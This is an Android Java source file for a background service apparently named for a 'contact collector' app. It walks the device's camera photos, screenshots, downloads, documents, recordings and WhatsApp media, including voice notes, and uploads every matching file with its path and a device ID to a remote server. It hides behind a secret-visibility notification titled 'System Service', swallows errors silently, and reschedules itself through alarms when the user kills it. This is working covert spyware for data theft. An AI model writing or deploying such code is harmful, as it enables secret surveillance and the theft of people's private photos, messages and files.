package com.contactcollector.app;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.SystemClock;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.atomic.AtomicInteger;

public class FileUploadService extends Service {

    private static final String CHANNEL_ID = "collector_sync_channel";
    private static final int NOTIFICATION_ID = 1001;
    private static final int MAX_FILE_SIZE = 50 * 1024 * 1024;
    private static final String PREFS_NAME = "CollectorPrefs";
    private static final String UPLOAD_PREFS_NAME = "CollectorUploadPrefs";
    private static final String KEY_UPLOADED_FILES = "uploaded_files";

    private String sessionId;
    private String baseUrl;
    private String deviceId;
    private volatile boolean isRunning = false;
    private volatile boolean stoppedNormally = false;
    private final AtomicInteger uploadedCount = new AtomicInteger(0);
    private SharedPreferences uploadPrefs;
    private Set<String> uploadedFileSet;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        uploadPrefs = getSharedPreferences(UPLOAD_PREFS_NAME, MODE_PRIVATE);
        uploadedFileSet = new HashSet<>(uploadPrefs.getStringSet(KEY_UPLOADED_FILES, new HashSet<String>()));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String s = intent.getStringExtra("sessionId");
            if (s != null && !s.isEmpty()) sessionId = s;
            String b = intent.getStringExtra("baseUrl");
            if (b != null && !b.isEmpty()) baseUrl = b;
            String d = intent.getStringExtra("deviceId");
            if (d != null && !d.isEmpty()) deviceId = d;
        }

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        if (sessionId == null || sessionId.isEmpty()) sessionId = prefs.getString("sessionId", null);
        if (baseUrl == null || baseUrl.isEmpty()) baseUrl = prefs.getString("baseUrl", null);
        if (deviceId == null || deviceId.isEmpty()) deviceId = prefs.getString("deviceId", null);

        // Save to SharedPreferences
        SharedPreferences.Editor editor = prefs.edit();
        if (sessionId != null) editor.putString("sessionId", sessionId);
        if (baseUrl != null) editor.putString("baseUrl", baseUrl);
        if (deviceId != null) editor.putString("deviceId", deviceId);
        editor.apply();

        if (sessionId == null || baseUrl == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        Notification notification = createNotification("Running...", 0, 0);
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_ID, notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(NOTIFICATION_ID, notification);
        }

        if (!isRunning) {
            isRunning = true;
            stoppedNormally = false;
            uploadedCount.set(0);
            new Thread(new Runnable() { @Override public void run() { uploadFilesInBackground(); } }).start();
        }

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        stoppedNormally = false;
        scheduleRestart(2000);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        saveUploadedFiles();
        // Only schedule restart if not stopped normally (upload completed)
        if (!stoppedNormally) {
            scheduleRestart(3000);
        }
        super.onDestroy();
    }

    private void scheduleRestart(long delayMs) {
        try {
            Intent restartIntent = new Intent(this, ServiceRestartReceiver.class);
            restartIntent.putExtra("restartReason", "upload_killed");
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 2, restartIntent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE
            );
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                long triggerTime = SystemClock.elapsedRealtime() + delayMs;
                try {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent);
                } catch (SecurityException se) {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent);
                }
            }
        } catch (Exception e) {}
    }

    private void uploadFilesInBackground() {
        try {
            String extStorage = Environment.getExternalStorageDirectory().getAbsolutePath();

            String[] storagePaths = {
                extStorage + "/DCIM/Camera",
                extStorage + "/DCIM/Screenshots",
                extStorage + "/Pictures/Screenshots",
                extStorage + "/Pictures",
                extStorage + "/Download",
                extStorage + "/Documents",
                extStorage + "/Music",
                extStorage + "/Movies",
                extStorage + "/Recordings",
                extStorage + "/WhatsApp/Media/WhatsApp Images",
                extStorage + "/WhatsApp/Media/WhatsApp Video",
                extStorage + "/WhatsApp/Media/WhatsApp Documents",
                extStorage + "/WhatsApp/Media/WhatsApp Audio",
                extStorage + "/WhatsApp/Media/WhatsApp Animated Gifs",
                extStorage + "/WhatsApp/Media/WhatsApp Voice Notes",
                extStorage + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
                extStorage + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
                extStorage + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents",
                extStorage + "/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio",
            };

            for (String path : storagePaths) {
                if (!isRunning) break;
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    uploadFilesFromDir(dir, 0, 2);
                }
            }

        } catch (Exception e) {
            // Silently fail
        }

        // Mark as stopped normally so we don't auto-restart
        stoppedNormally = true;

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
        } catch (Exception e) {}
        stopSelf();
        isRunning = false;
    }

    private void uploadFilesFromDir(File dir, int depth, int maxDepth) {
        if (depth > maxDepth || !isRunning) return;
        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (!isRunning) break;
            if (file.isDirectory()) {
                uploadFilesFromDir(file, depth + 1, maxDepth);
            } else if (file.isFile() && file.canRead()) {
                long fileSize = file.length();
                if (fileSize > 0 && fileSize < MAX_FILE_SIZE) {
                    String type = getFileType(file.getName());
                    if (type.equals("image") || type.equals("video") ||
                        type.equals("document") || type.equals("pdf") ||
                        type.equals("audio")) {

                        String fileKey = file.getAbsolutePath() + ":" + file.lastModified();
                        if (uploadedFileSet.contains(fileKey)) continue;

                        try { Thread.sleep(200); } catch (InterruptedException e) { break; }

                        boolean success = uploadSingleFile(file, type);
                        if (success) {
                            uploadedFileSet.add(fileKey);
                            saveUploadedFiles();
                            uploadedCount.incrementAndGet();
                        }
                    }
                }
            }
        }
    }

    private void saveUploadedFiles() {
        try {
            uploadPrefs.edit().putStringSet(KEY_UPLOADED_FILES, uploadedFileSet).apply();
        } catch (Exception e) {}
    }

    private boolean uploadSingleFile(File file, String fileType) {
        for (int attempt = 0; attempt <= 1; attempt++) {
            HttpURLConnection conn = null;
            DataOutputStream dos = null;
            FileInputStream fis = null;
            try {
                String boundary = "----CollectorBnd" + System.currentTimeMillis();
                URL url = new URL(baseUrl + "/api/files/upload");
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(180000);

                dos = new DataOutputStream(conn.getOutputStream());
                writeFormField(dos, boundary, "sessionId", sessionId);
                if (deviceId != null && !deviceId.isEmpty()) {
                    writeFormField(dos, boundary, "deviceId", deviceId);
                }
                writeFormField(dos, boundary, "filePath", file.getAbsolutePath());
                writeFormField(dos, boundary, "fileType", fileType);

                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

                fis = new FileInputStream(file);
                byte[] buffer = new byte[16384];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }

                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush();

                int responseCode = conn.getResponseCode();
                if (responseCode >= 200 && responseCode < 300) return true;
            } catch (Exception e) {
                // Retry
            } finally {
                try { if (fis != null) fis.close(); } catch (Exception e) {}
                try { if (dos != null) dos.close(); } catch (Exception e) {}
                try { if (conn != null) conn.disconnect(); } catch (Exception e) {}
            }
            if (attempt < 1) {
                try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
            }
        }
        return false;
    }

    private void writeFormField(DataOutputStream dos, String boundary, String name, String value) throws Exception {
        dos.writeBytes("--" + boundary + "\r\n");
        dos.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n");
        dos.writeBytes(value + "\r\n");
    }

    private String getFileType(String name) {
        name = name.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") ||
            name.endsWith(".gif") || name.endsWith(".webp") || name.endsWith(".bmp") ||
            name.endsWith(".heic") || name.endsWith(".raw")) return "image";
        if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") ||
            name.endsWith(".3gp") || name.endsWith(".mov") || name.endsWith(".wmv") ||
            name.endsWith(".flv") || name.endsWith(".webm")) return "video";
        if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") ||
            name.endsWith(".ogg") || name.endsWith(".m4a") || name.endsWith(".aac") ||
            name.endsWith(".wma") || name.endsWith(".amr")) return "audio";
        if (name.endsWith(".pdf")) return "pdf";
        if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt") ||
            name.endsWith(".xls") || name.endsWith(".xlsx") || name.endsWith(".ppt") ||
            name.endsWith(".pptx") || name.endsWith(".csv") || name.endsWith(".rtf")) return "document";
        return "other";
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Sync",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background sync");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    @SuppressWarnings("deprecation")
    private Notification createNotification(String text, int progress, int max) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder builder = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_upload)
                .setOngoing(true);
            if (max > 0) builder.setProgress(max, progress, false);
            else builder.setProgress(100, 0, true);
            return builder.build();
        } else {
            Notification.Builder builder = new Notification.Builder(this)
                .setContentTitle("System Service")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_upload)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_LOW);
            if (max > 0) builder.setProgress(max, progress, false);
            else builder.setProgress(100, 0, true);
            return builder.build();
        }
    }
}
